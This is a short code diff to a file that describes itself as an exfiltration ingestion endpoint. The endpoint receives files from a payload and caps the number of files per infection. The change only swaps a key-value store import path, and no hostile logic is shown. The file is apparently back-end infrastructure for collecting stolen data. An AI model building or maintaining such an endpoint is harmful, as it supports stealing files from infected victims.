@@ -1,7 +1,7 @@
 // vercel-dashboard/api/exfil/upload.js
 // Exfiltration ingestion endpoint - receives files from payload
 
-import { kv } from '@vercel/kv';
+import { kv } from '../../lib/kv.js';
 
 const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB
 const MAX_FILES_PER_INFECTION = 1000;
